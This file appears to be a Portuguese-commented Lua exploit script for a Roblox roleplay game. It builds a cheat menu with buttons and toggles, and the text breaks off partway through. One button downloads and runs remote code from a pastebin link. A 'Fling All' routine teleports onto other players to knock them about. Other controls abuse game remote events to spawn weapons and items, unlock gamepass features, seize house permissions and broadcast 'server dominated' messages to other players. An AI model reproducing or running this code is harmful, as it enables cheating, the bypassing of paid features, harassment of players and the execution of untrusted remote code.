updateDropdown(playerDropdownV13)

local section = AddSection(Main, {"Opções Em Geral"})

AddButton(Main, {
  Name = "Bring All",
Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
    end
})

-- Serviços necessários
local playerService = game:GetService('Players')
local runService = game:GetService('RunService')
local localPlayer = playerService.LocalPlayer

-- Variáveis globais
local flingV14Toggle = false
local currentPlayerIndex = 1
local flingV14Connection
local players

-- Função para teleportar para a coordenada específica
local function teleportToCoordinate()
    local teleportPosition = Vector3.new(-58, 54, -183) -- Coordenada para onde você deseja teleportar
    if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
        localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(teleportPosition)
    end
end

-- Função para flingar jogadores em sequência
local function flingPlayersInSequence()
    if flingV14Toggle then
        -- Obtém a lista de jogadores uma vez
        players = playerService:GetPlayers()
        
        -- Reseta o índice do jogador atual
        currentPlayerIndex = 1
        
        -- Looping de teleportes em cada jogador
        flingV14Connection = runService.Heartbeat:Connect(function()
            -- Ignora o jogador local
            while players[currentPlayerIndex] == localPlayer do
                currentPlayerIndex = currentPlayerIndex + 1
                if currentPlayerIndex > #players then
                    currentPlayerIndex = 1
                end
            end
            
            local targetPlayer = players[currentPlayerIndex]
            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    localPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame

                    -- Verifica se o jogador alvo está sentado
                    if targetPlayer.Character:FindFirstChild("Humanoid") and targetPlayer.Character.Humanoid.SeatPart then
                        teleportToCoordinate()
                        
                        -- Espera 3 segundos antes de ir para o próximo jogador
                        wait(5)
                        currentPlayerIndex = currentPlayerIndex + 1
                        
                        if currentPlayerIndex > #players then
                            currentPlayerIndex = 1
                        end
                    end
                end
            end
        end)
    end
end

-- Função de callback para o toggle
local function onFlingV14Toggle(value)
    flingV14Toggle = value
    if flingV14Toggle then
        flingPlayersInSequence()
    else
        -- Desconecta as conexões quando o toggle é desativado
        if flingV14Connection then
            flingV14Connection:Disconnect()
            flingV14Connection = nil
        end
    end
end

-- Adiciona o Toggle para ativar/desativar o Fling V14
AddToggle(Main, {
    Name = "Fling All [V0.2]",
    Default = false,
    Callback = onFlingV14Toggle
})

-- Variável para armazenar a posição original do jogador
local originalPosition

-- Função para salvar a posição original do jogador
local function saveOriginalPosition()
    local character = game.Players.LocalPlayer.Character
    if character then
        originalPosition = character.HumanoidRootPart.CFrame
        print("Posição original salva:", originalPosition)
    else
        print("Erro ao salvar a posição original: personagem não encontrado.")
    end
end

-- Função para teleportar de volta para a posição original
local function teleportToOriginalPosition()
    local character = game.Players.LocalPlayer.Character
    if character and originalPosition then
        character.HumanoidRootPart.CFrame = originalPosition
        print("Teleportado de volta para a posição original!")
    else
        print("Erro ao teleportar de volta para a posição original.")
    end
end

-- Função para executar a ação de alerta com a arma
local function alarmGun()
    -- Salvar a posição original antes de teleportar
    saveOriginalPosition()

    -- Puxa o item Sniper
    local args = {
        [1] = "PickingTools",
        [2] = "Sniper"
    }
    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))

    -- Equipa o item Sniper
    local backpack = game.Players.LocalPlayer.Backpack
    local character = game.Players.LocalPlayer.Character

    local sniper = backpack:FindFirstChild("Sniper") or character:FindFirstChild("Sniper")

    if sniper then
        -- Se o item for encontrado, equipá-lo
        game.Players.LocalPlayer.Character.Humanoid:EquipTool(sniper)

        -- Salvar a posição atual do jogador
        local currentPosition = character.HumanoidRootPart.CFrame

        -- Teleportar o jogador para as coordenadas especificadas
        character.HumanoidRootPart.CFrame = CFrame.new(315, 5, 42)

        print("AlarmGun equipado e jogador teleportado!")

        -- Esperar um pouco antes de teleportar de volta para garantir que a animação seja concluída
        wait(2)

        -- Teleportar de volta para a posição original após usar a Sniper
        teleportToOriginalPosition()
    else
        -- Se o item não for encontrado, exibir uma mensagem de erro
        print("Sniper não encontrado no inventário ou personagem.")
    end
end

-- Adicionar o botão "AlarmGun" à seção "Misc Section"
AddButton(Main, {
    Name = "AlarmGun",
    Description = "Equipa a Sniper e teleporta para a coordenada 315, 5, 42",
    Callback = function()
        alarmGun()
    end
})

local section = AddSection(Main, {"Protection Section"})

-- Variável para armazenar o estado da proteção
local voidProtectionEnabled = false

-- Função para ativar a proteção contra o vazio
local function ActivateVoidProtection()
    voidProtectionEnabled = true
    -- Definindo FallenPartsDestroyHeight para NaN para prevenir a destruição
    game.Workspace.FallenPartsDestroyHeight = 0/0
end

-- Função para desativar a proteção contra o vazio
local function DeactivateVoidProtection()
    voidProtectionEnabled = false
    -- Definindo FallenPartsDestroyHeight para um valor que permite destruição
    game.Workspace.FallenPartsDestroyHeight = -9999999999999999999999 -- Ajuste este valor conforme necessário
end

-- Adicionar o botão "Ativar Void Protection V8" à seção "Main"
AddButton(Main, {
    Name = "Ativar Void Protection [V9]",
    Callback = function()
        ActivateVoidProtection()
    end
})

AddToggle(Main, {
    Name = "Ant Sit",
    Default = false,  -- Define o estado padrão como desativado
    Callback = function(Value)
        local player = game.Players.LocalPlayer
        local humanoid = player.Character and player.Character.Humanoid
        
        if humanoid then
            if Value then
                -- Quando o toggle está ativado (Value é true), o humanoide não pode sentar em assentos
                humanoid:SetStateEnabled("Seated", false)
            else
                -- Quando o toggle está desativado (Value é false), o humanoide pode sentar em assentos normalmente
                humanoid:SetStateEnabled("Seated", true)
            end
        else
            print("Erro: Personagem não encontrado.")
        end
    end    
})

local TeleportTab = MakeTab({Name = "Teleportes"})

local Label = AddTextLabel(TeleportTab,
{"Aviso [!] Está Pagina Ja foi finalizada"})

local section = AddSection(TeleportTab, {"Comerciais"})

AddButton(TeleportTab, {
    Name = "Comercial 1",
    Callback = function()
        local plr = game.Players.LocalPlayer
        local char = plr.Character
        local hrp = char:FindFirstChild("HumanoidRootPart")

        if hrp then
            hrp.CFrame = CFrame.new(-242.68215942382812, 89.68680572509766, -549.6495361328125)
        else
            warn("HumanoidRootPart not found")
        end
    end
})

AddButton(TeleportTab, {
    Name = "Comercial 2",
    Callback = function()
        local plr = game.Players.LocalPlayer
        local char = plr.Character
        local hrp = char:FindFirstChild("HumanoidRootPart")

        if hrp then
            hrp.CFrame = CFrame.new(-630.480712890625, 26.586822509765625, 365.14093017578125)
        else
            warn("HumanoidRootPart not found")
        end
    end
})

local section = AddSection(TeleportTab, {"Teleportes"})

-- Function to teleport to Teleport
local function teleportToGasStation()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(192, 4, 272)
end

AddButton(TeleportTab, {
    Name = "Teleportar Atrás dos Prédios",
    Description = "",
    Callback = teleportToGasStation
})

-- Function to teleport to Teleport
local function teleportToCenter()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(136, 4, 117)
end

AddButton(TeleportTab, {
    Name = "Teleportar Para o Centro",
    Description = "",
    Callback = teleportToCenter
})

-- Function to teleport to Criminal
local function teleportToCriminal()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-119, -28, 235)
end

AddButton(TeleportTab, {
    Name = "Criminal",
    Description = "Teleporta para as coordenadas do Criminal",
    Callback = teleportToCriminal
})

-- Function to teleport to House Abandoned
local function teleportToHouseAbandoned()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(986, 4, 63)
end

AddButton(TeleportTab, {
    Name = "Casa Abandonada",
    Description = "Teleporta para as coordenadas da Casa Abandonada",
    Callback = teleportToHouseAbandoned
})

-- Function to teleport to Portal Agency
local function teleportToPortalAgency()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(672, 4, -296)
end

AddButton(TeleportTab, {
    Name = "Portal da Agência",
    Description = "Teleporta para as coordenadas do Portal da Agência",
    Callback = teleportToPortalAgency
})

-- Function to teleport to Secret Location
local function teleportToSecretLocation()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(505, -75, 143)
end

AddButton(TeleportTab, {
    Name = "Local Secreto",
    Description = "Teleporta para as coordenadas do Local Secreto",
    Callback = teleportToSecretLocation
})

-- Function to teleport to School
local function teleportToSchool()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-312, 4, 211)
end

AddButton(TeleportTab, {
    Name = "Escola",
    Description = "Teleporta para as coordenadas da Escola",
    Callback = teleportToSchool
})

-- Function to teleport to Brooks Diner
local function teleportToBrooksDiner()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(161, 8, 52)
end

AddButton(TeleportTab, {
    Name = "Brooks Diner",
    Description = "Teleporta para as coordenadas do Brooks Diner",
    Callback = teleportToBrooksDiner
})

local function teleportToBrooksDiner()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-26, 4, -23)
end

AddButton(TeleportTab, {
    Name = "Início",
    Description = "Teleporta para as coordenadas do Brooks Diner",
    Callback = teleportToBrooksDiner
})


-- Function to teleport to Hospital
local function teleportToHospital()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-309, 4, 71)
end

AddButton(TeleportTab, {
    Name = "Hospital",
    Description = "Teleporta para as coordenadas do Hospital",
    Callback = teleportToHospital
})

-- Function to teleport to Arch
local function teleportToArch()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-589, 141, -59)
end

AddButton(TeleportTab, {
    Name = "Arco",
    Description = "Teleporta para as coordenadas do Arco",
    Callback = teleportToArch
})

-- Function to teleport to Agency
local function teleportToAgency()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(179, 4, -464)
end

AddButton(TeleportTab, {
    Name = "Agência",
    Description = "Teleporta para as coordenadas da Agência",
    Callback = teleportToAgency
})

-- Function to teleport to Secret Room in Workshop
local function teleportToSecretRoomInWorkshop()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 4, -495)
end

AddButton(TeleportTab, {
    Name = "Sala Secreta na Oficina",
    Description = "Teleporta para as coordenadas da Sala Secreta na Oficina",
    Callback = teleportToSecretRoomInWorkshop
})

-- Function to teleport to Secret Room 2
local function teleportToSecretRoom2()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-343, 4, -613)
end

AddButton(TeleportTab, {
    Name = "Sala Secreta 2",
    Description = "Teleporta para as coordenadas da Sala Secreta 2",
    Callback = teleportToSecretRoom2
})

-- Function to teleport to Island 1
local function teleportToIsland1()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1925, 23, 127)
end

AddButton(TeleportTab, {
    Name = "Ilha 1",
    Description = "Teleporta para as coordenadas da Ilha 1",
    Callback = teleportToIsland1
})

-- Function to teleport to Airport
local function teleportToAirport()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(310, 5, 31)
end

AddButton(TeleportTab, {
    Name = "Aeroporto",
    Description = "Teleporta para as coordenadas do Aeroporto",
    Callback = teleportToAirport
})

-- Function to teleport to Hotel Center
local function teleportToHotelCenter()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(182, 4, 150)
end

AddButton(TeleportTab, {
    Name = "Centro dos Hotéis",
    Description = "Teleporta para as coordenadas do Centro dos Hotéis",
    Callback = teleportToHotelCenter
})

-- Function to teleport to Lower Houses
local function teleportToLowerHouses()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(63, 35, 410)
end

AddButton(TeleportTab, {
    Name = "Casas Inferiores",
    Description = "Teleporta para as coordenadas das Casas Inferiores",
    Callback = teleportToLowerHouses
})

-- Function to teleport to Mountain 1
local function teleportToMountain1()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-670, 251, 765)
end

AddButton(TeleportTab, {
    Name = "Montanha 1",
    Description = "Teleporta para as coordenadas da Montanha 1",
    Callback = teleportToMountain1
})

-- Function to teleport to On Top of School
local function teleportToOnTopOfSchool()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-370, 50, 173)
end

AddButton(TeleportTab, {
    Name = "Em Cima da Escola",
    Description = "Teleporta para as coordenadas Em Cima da Escola",
    Callback = teleportToOnTopOfSchool
})

local Main = MakeTab({Name = "Get Items"})

local Label = AddTextLabel(Main,
{"Aviso [!] Está Pagina Ja foi Finalizada"})

AddButton(Main, {
  Name = "Pegar Cartão Da Agência",
      Callback = function()
        local args = {
            [1] = "PickingTools",
            [2] = "KeyCardDarkGreen"
        }
        local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
        if remoteFunction then
            remoteFunction:InvokeServer(unpack(args))
        else
            warn("Função remota '1Too1l' não encontrada em ReplicatedStorage.RE")
        end
    end
})

AddButton(Main, {
  Name = "Pegar Cartão da elétrica",
 Callback = function()
        local args = {
            [1] = "PickingTools",
            [2] = "PowerKeyCard"
        }
        local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
        if remoteFunction then
            remoteFunction:InvokeServer(unpack(args))
        else
            warn("Função remota '1Too1l' não encontrada em ReplicatedStorage.RE")
        end
    end
})

AddButton(Main, {
  Name = "Pegar Arco",
  Callback = function()
        local args = {
            [1] = "PickingTools",
            [2] = "Arch"
        }
        local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
        if remoteFunction then
            remoteFunction:InvokeServer(unpack(args))
        else
            warn("Função remota '1Too1l' não encontrada em ReplicatedStorage.RE")
        end
    end
})

AddButton(Main, {
  Name = "Pegar Crystal 1",
  Callback = function()
        local args = {
            [1] = "PickingTools",
            [2] = "Crystals"
        }
        local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
        if remoteFunction then
            remoteFunction:InvokeServer(unpack(args))
        else
            warn("Função remota '1Too1l' não encontrada em ReplicatedStorage.RE")
        end
    end
})

AddButton(Main, {
  Name = "Crystal 2",
  Callback = function()
        local args = {
            [1] = "PickingTools",
            [2] = "Crystal"
        }
        local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
        if remoteFunction then
            remoteFunction:InvokeServer(unpack(args))
        else
            warn("Função remota '1Too1l' não encontrada em ReplicatedStorage.RE")
        end
    end
})

AddButton(Main, {
  Name = "Agência Book",
  Callback = function()
        local args = {
            [1] = "PickingTools",
            [2] = "AgencyBook"
        }
        local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
        if remoteFunction then
            remoteFunction:InvokeServer(unpack(args))
        else
            warn("Função remota '1Too1l' não encontrada em ReplicatedStorage.RE")
        end
    end
})

AddButton(Main, {
  Name = "OldKey",
  Callback = function()
        local args = {
            [1] = "PickingTools",
            [2] = "OldKey"
        }
        local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
        if remoteFunction then
            remoteFunction:InvokeServer(unpack(args))
        else
            warn("Função remota '1Too1l' não encontrada em ReplicatedStorage.RE")
        end
    end
})

AddButton(Main, {
  Name = "Arma De Assalto",
  Callback = function()
        local args = {
            [1] = "PickingTools",
            [2] = "Assault"
        }
        local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
        if remoteFunction then
            remoteFunction:InvokeServer(unpack(args))
        else
            warn("Função remota '1Too1l' não encontrada em ReplicatedStorage.RE")
        end
    end
})

AddButton(Main, {
  Name = "Shotgun",
      Callback = function()
        local args = {
            [1] = "PickingTools",
            [2] = "Shotgun"
        }
        local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
        if remoteFunction then
            remoteFunction:InvokeServer(unpack(args))
        else
            warn("Função remota '1Too1l' não encontrada em ReplicatedStorage.RE")
        end
    end
})

AddButton(Main, {
  Name = "Couch",
      Callback = function()
        local args = {
            [1] = "PickingTools",
            [2] = "Couch"
        }
        local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
        if remoteFunction then
            remoteFunction:InvokeServer(unpack(args))
        else
            warn("Função remota '1Too1l' não encontrada em ReplicatedStorage.RE")
        end
    end
})

local Main = MakeTab({Name = "Car"})

local Label = AddTextLabel(Main,
{"Aviso [!] Está Pagina Ja foi Finalizada"})

local section = AddSection(Main, {"Car Music [Premium]"})

-- Adicionar uma TextBox para inserir IDs de músicas
local musicTextBox = AddTextBox(Main, {
    Name = "Music ID",
    Default = "",
    TextDisappear = false,
    PlaceholderText = "Insira o ID da música",
    ClearText = true,
    Callback = function(value)
        -- Esta função é chamada sempre que o usuário insere um valor na TextBox.
        -- Podemos armazenar o valor em uma variável global ou em uma variável local.
        musicId = value
    end
})

-- Adicionar um botão "Play Music" à seção "Car"
AddButton(Main, {
    Name = "Play Music [Gamepass Premium]",
    Description = "Toca música no carro",
    Callback = function()
        -- Verifica se um ID de música foi inserido na TextBox
        if musicId and musicId ~= "" then
            -- Chama o evento para tocar o som com base no ID inserido
            local args = {
                [1] = "PickingCarMusicText",
                [2] = musicId  -- Usar o ID de música inserido na TextBox
            }
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sCa1r"):FireServer(unpack(args))
        else
            -- Se nenhum ID foi inserido, você pode adicionar um aviso ou mensagem para o usuário
            print("Por favor, insira um ID de música válido na TextBox.")
        end
    end
})

-- Adicionar uma TextBox para inserir a velocidade do carro
local speedTextBox = AddTextBox(Main, {
    Name = "Speed Car",
    Default = "",
    TextDisappear = false,
    PlaceholderText = "Insira a velocidade do carro",
    ClearText = true,
    Callback = function(value)
        -- Esta função é chamada sempre que o usuário insere um valor na TextBox.
        -- Podemos armazenar o valor em uma variável global ou em uma variável local.
        carSpeed = tonumber(value)  -- Convertendo para número
    end
})

-- Adicionar um botão "Speed Car" à seção "Car"
AddButton(Main, {
    Name = "Apply Speed Car",
    Description = "Define a velocidade do carro",
    Callback = function()
        -- Verifica se uma velocidade válida foi inserida na TextBox
        if carSpeed and carSpeed > 0 then
            -- Chama o evento para definir a velocidade do carro com base no valor inserido
            local args = {
                [1] = "PlayerGiveSpeedLower",
                [2] = tostring(carSpeed)  -- Usar a velocidade inserida na TextBox
            }
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sCa1r"):FireServer(unpack(args))
        else
            -- Se nenhum valor válido foi inserido, você pode adicionar um aviso ou mensagem para o usuário
            print("Por favor, insira uma velocidade válida na TextBox.")
        end
    end
})

local section = AddSection(Main, {"A Roblox Contém Falhas [Não Pode funcionar Corretamente]"})

AddButton(Main, {
  Name = "Inserir Texto Em Truck Shnmaxscripts",
  Callback = function()
        local args = {
            [1] = "ReturningSemiName",
            [2] = "Ș̸̨̱̱̏͒H̵̼̼̒̄N̵̬̣̔̒M̸͙͇̖̙̽͛̓A̴̡̨̲͇͐X̶̡̮͂S̸̮̞̋͆C̸͚̹̚͝Ȑ̸̥͉̱̘̐̍Ḯ̶̮͚P̵̨͚̏͗̐͜Ṭ̴̟̝̹̅̋̚Ṡ̷̢̪̟͗"
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Cemeter1y"):FireServer(unpack(args))
    end
})

AddButton(Main, {
  Name = "Inserir Texto Em Truck Servidor Dominado",
  Callback = function()
        local args = {
            [1] = "ReturningSemiName",
            [2] = "S̵̙͕̀̃Ḛͭ̉̇͟R͉̜̎͡͠V̘̪͆̂̅I̍̅̀̎̊D̶͔̭̪̻O̖̼ͩ͌͐R͉̜̎͡͠ D̶͔̭̪̻O̖̼ͩ͌͐M͉̅ͮ͒ͤI̍̅̀̎̊N̺̻̔̆ͅA̷͙ͭͫ̕D̶͔̭̪̻O̖̼ͩ͌͐"
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Cemeter1y"):FireServer(unpack(args))
    end
})

local section = AddSection(Main, {"Loop Texto"})

local isLooping = false

local function toggleLoopingTrocarTexto(Value)
    isLooping = Value

    if isLooping then
        while isLooping do
            local args = {
                [1] = "ReturningSemiName",
                [2] = "Ḛͭ̉̇͟R͉̜̎͡͠A̷͙ͭͫ̕ D̶͔̭̪̻Ḛͭ̉̇͟ A̷͙ͭͫ̕T̨͈͗̌ͥA̷͙ͭͫ̕Q̦̭̀̾͜U̠҉̷̙ͦḚͭ̉̇͟S̵̙͕̀̃"
            }
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Cemeter1y"):FireServer(unpack(args))
            wait(1)

            args[2] = "I̍̅̀̎̊N̺̻̔̆ͅV̘̪͆̂̅A̷͙ͭͫ̕S̵̙͕̀̃A̷͙ͭͫ̃̕O̖̼ͩ͌͐"
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Cemeter1y"):FireServer(unpack(args))
            wait(1)
        end
    end
end

local Toggle = AddToggle(Main, {
    Name = "Loop Trocar Texto",
    Default = false,
    Callback = toggleLoopingTrocarTexto
})

local isLooping = false

local function toggleLoopingTrocarTexto(Value)
    isLooping = Value

    if isLooping then
        while isLooping do
            local args = {
                [1] = "ReturningSemiName",
                [2] = "S̵̙͕̀̃Ḛͭ̉̇͟R͉̜̎͡͠V̘̪͆̂̅Ḛͭ̉̇͟R͉̜̎͡͠ C̵͉͋̔͞R͉̜̎͡͠A̷͙ͭͫ̕S̵̙͕̀̃Hͥ̽ͣ̃̔Ḛͭ̉̇͟D̶͔̭̪̻"
            }
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Cemeter1y"):FireServer(unpack(args))
            wait(1)

            args[2] = "Ḛͭ̉̇͟R͉̜̎͡͠R͉̜̎͡͠O̖̼ͩ͌͐R͉̜̎͡͠ Ḛͭ̉̇͟R͉̜̎͡͠R͉̜̎͡͠O̖̼ͩ͌͐R͉̜̎͡͠ "
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Cemeter1y"):FireServer(unpack(args))
            wait(1)
        end
    end
end

local Toggle = AddToggle(Main, {
    Name = "Loop Trocar Texto",
    Default = false,
    Callback = toggleLoopingTrocarTexto
})

local isLooping = false

local function toggleLoopingTrocarTexto(Value)
    isLooping = Value

    if isLooping then
        while isLooping do
            local args = {
                [1] = "ReturningSemiName",
                [2] = "A̷͙ͭͫ̕D̶͔̭̪̻M͉̅ͮ͒ͤI̍̅̀̎̊N̺̻̔̆ͅ"
            }
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Cemeter1y"):FireServer(unpack(args))
            wait(1)

            args[2] = "A̷͙ͭͫ̕N̺̻̔̆ͅT̨͈͗̌ͥ K͕͓͌̎̾I̍̅̀̎̊D̶͔̭̪̻S̵̙͕̀̃"
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Cemeter1y"):FireServer(unpack(args))
            wait(1)
        end
    end
end

local Toggle = AddToggle(Main, {
    Name = "Loop Trocar Texto",
    Default = false,
    Callback = toggleLoopingTrocarTexto
})

local section = AddSection(Main, {"Por Favor Não pressione muitas Vezes [Kick]"})

AddButton(Main, {
  Name = "Spawn School Bus",
  Callback = function()
        local args = {
            [1] = "PickingCar",
            [2] = "SchoolBus"
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))
    end
})
   
AddButton(Main, {
  Name = "Spawn Truck",
  Callback = function()
        local args = {
            [1] = "PickingCar",
            [2] = "Semi"
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))
    end
})


AddButton(Main, {
  Name = "Spawn Military Boat",
  Callback = function()
      local args = {
    [1] = "PickingBoat",
    [2] = "MilitaryBoatFree"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))
    end
})

local Main = MakeTab({Name = "House"})

local Label = AddTextLabel(Main,
{"Aviso [!] Está Pagina Ja foi Finalizada"})

local section = AddSection(Main, {"Edições De Casa"})

-- Variável para armazenar a mensagem inserida pelo usuário para a biografia da casa
local houseBioMessage = ""

-- Adicionar uma Textbox para o usuário inserir a mensagem para a biografia da casa
AddTextBox(Main, {
    Name = "Insira a bio da casa",
    Default = "",
    PlaceholderText = "Digite a mensagem para a bio da casa",
    ClearText = true,
    Callback = function(value)
        houseBioMessage = value
    end
})

-- Adicionar o botão "Adicionar A Bio Dá casa " à seção "House"
AddButton(Main, {
    Name = "Adicionar A Bio Dá casa ",
    Description = "Adiciona uma biografia para a casa com a mensagem inserida",
    Callback = function()
        -- Verificar se a mensagem não está vazia
        if houseBioMessage and houseBioMessage ~= "" then
            local args = {
                [1] = "BusinessName",
                [2] = houseBioMessage
            }
            -- Definir a biografia da casa com a mensagem inserida pelo usuário
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPHous1eEven1t"):FireServer(unpack(args))
            print("A biografia da casa foi definida com a mensagem:", houseBioMessage)
        else
            print("Por favor, insira uma mensagem válida para definir a biografia da casa.")
        end
    end
})

-- Adicione o botão "Abrir/Fechar Portas" à seção "House"
AddButton(Main, {
    Name = "Abrir/Fechar Portas",
    Description = "Abre ou fecha as portas da casa",
    Callback = function()
        local args = {
            [1] = "LockDoors"
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sHous1e"):FireServer(unpack(args))
    end
})

-- Adicione o botão "Fogo On" à seção "House"
AddButton(Main, {
    Name = "Fogo ON",
    Description = "Ativa o Fogo da casa",
    Callback = function()
        local args = {
            [1] = "PlayerWantsFireOnFirePassNotShowingAnyone"
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sHous1e"):FireServer(unpack(args))
    end
}) 

AddButton(Main, {
    Name = "Fogo OFF",
    Description = "Ativa o Fogo da casa",
    Callback = function()
        local args = {
            [1] = "PlayerWantsFireOffFirePass"
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sHous1e"):FireServer(unpack(args))
    end
}) 

local section = AddSection(Main, {"Perm House"})

-- Inicializando como string para evitar conflitos de tipo
local a = "0"

-- Função de callback para a TextBox
local function onTextBoxInput(value)
    a = value
end

-- Adiciona a TextBox para inserir o valor de 'a'
AddTextBox(Main, {
    Name = "Insira aqui o Numero Da Casa",
    Default = "",
    PlaceholderText = "Insira o Numero da Casa",
    ClearText = true,
    Callback = onTextBoxInput
})

-- Callback para executar o código de permissão da casa
local function executePermissionCode()
    local args = {
        [1] = "GivePermissionLoopToServer",
        [2] = game.Players.LocalPlayer,
        [3] = tonumber(a)  -- Convertendo 'a' para número, se necessário
    }

    -- Verifica se o evento existe antes de disparar
    local event = game:GetService("ReplicatedStorage"):FindFirstChild("RE"):FindFirstChild("1Playe1rTrigge1rEven1t")
    if event then
        event:FireServer(unpack(args))
    else
        warn("Evento '1Playe1rTrigge1rEven1t' não encontrado.")
    end
end

-- Adiciona um botão para executar o código
AddButton(Main, {
    Name = "Get Permission House",
    Callback = executePermissionCode
})

local Main = MakeTab({Name = "Avatar"})

local Label = AddTextLabel(Main,
{"Aviso [!] Está Pagina Ja foi Finalizada"})

local section = AddSection(Main, {"Skin Rainbow"})

-- Lista de cores para alternar
local colors = {
    "Earth green",
    "Magenta",
    "Maroon",
    "Toothpaste",
    "Institutional white"
}

-- Varivel para controlar o estado do toggle
local isAutoColorEnabled = false

-- Funcao para alternar automaticamente as cores
local function AutoColorToggle(toggleValue)
    isAutoColorEnabled = toggleValue  -- Atualiza o estado do toggle

    -- Se o toggle for desativado, nao faz mais nada
    if not toggleValue then
        return
    end

    -- Loop para alternar entre as cores
    local index = 1
    while isAutoColorEnabled do
        local args = {
            [1] = "skintone",
            [2] = colors[index]
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
        index = index % #colors + 1  -- Avanca para a proxima cor circularmente
        wait(2)  -- Espera 3 segundos antes de trocar para a proxima cor (ajuste conforme necessario)
    end
end

-- Exemplo de uso:
AddToggle(Main, {
    Name = "Rainbow Skin",
    Default = false,
    Callback = function(Value)
        AutoColorToggle(Value)
    end
})

local section = AddSection(Main, {"Dominus"})

AddButton(Main, {
  Name = "Ametista Etéreo Dominus",
      Callback = function()
        local args = {
            [1] = "wear",
            [2] = 16573494434
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
    end
})

AddButton(Main, {
  Name = "Amethyst Dominus da Federação Caída",
      Callback = function()
        local args = {
            [1] = "wear",
            [2] = 16171467881
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
    end
})

AddButton(Main, {
  Name = "Dominus Formidulosus",
      Callback = function()
        local args = {
            [1] = "wear",
            [2] = 4255053867
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
    end
})

AddButton(Main, {
  Name = "Dominus-Claves",
      Callback = function()
        local args = {
            [1] = "wear",
            [2] = 1483721076
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
    end
})

AddButton(Main, {
  Name = "Dominus-Venari",
      Callback = function()
        local args = {
            [1] = "wear",
            [2] = 1483720409
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
    end
})

AddButton(Main, {
  Name = "Dominus Sombrio Verde",
      Callback = function()
        local args = {
            [1] = "wear",
            [2] = 96103379
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
    end
})

AddButton(Main, {
  Name = "Dominus Branco",
      Callback = function()
        local args = {
            [1] = "wear",
            [2] = 21070012
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
